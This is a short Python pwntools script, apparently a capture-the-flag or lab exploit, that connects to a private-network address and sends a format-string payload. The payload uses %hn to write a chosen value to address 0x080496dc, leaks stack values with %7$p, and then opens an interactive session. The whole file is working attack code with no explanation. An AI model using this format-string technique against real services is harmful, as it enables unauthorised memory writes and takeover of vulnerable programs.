from pwn import *
def main():
	conn = remote("192.168.56.101",49153)
	raw_input("$")
	conn.sendline("\xdc\x96\x04\x08%33692c%7$hn")
	print conn.recvline()
	conn.sendline("AAAA.%7$p")
	print conn.recvline()
	conn.sendline("BBBB.%7$p")
	conn.interactive()
	pass
main()
